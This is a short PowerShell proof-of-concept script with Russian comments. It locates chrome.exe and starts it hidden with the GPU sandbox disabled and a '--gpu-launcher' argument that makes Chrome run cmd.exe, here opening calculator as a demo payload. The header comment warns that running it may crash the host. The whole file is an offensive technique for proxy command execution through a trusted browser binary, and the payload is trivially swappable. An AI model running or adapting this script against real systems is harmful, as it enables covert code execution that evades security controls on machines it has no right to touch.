
#ПЕРВАЯ ВЕРСИЯ - НЕ ЗАПУСКАТЬ, ИНАЧЕ СЛОЖИТЕ ХОСТ

# Перечень возможных путей к chrome.exe
$possiblePaths = @(
    "$Env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "$Env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe",
    "$Env:LocalAppData\Google\Chrome\Application\chrome.exe"
)

# Функция поиска существующего chrome.exe
function Find-Chrome {
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            Write-Host "[+] Найден chrome.exe: $path"
            return $path
        }
    }
    Write-Error "[-] chrome.exe не найден в стандартных путях."
    exit 1
}

# Запуск chrome.exe с «payload» аргументами
function Launch-Payload {
    param (
        [string]$ChromePath
    )

    # Формируем аргументы
    $args = @(
        '--disable-gpu-sandbox'
        '--gpu-launcher="C:\Windows\System32\cmd.exe /c calc.exe"'
    )

    Write-Host "[*] Запускаем Chrome:"
    Write-Host "    $ChromePath $($args -join ' ')"

    # Запуск процесса в «detached» режиме
    Start-Process -FilePath $ChromePath -ArgumentList $args -WindowStyle Hidden
    Write-Host "[+] Процесс запущен, калькулятор должен открыться."
}

# Основной блок
$chrome = Find-Chrome
Launch-Payload -ChromePath $chrome
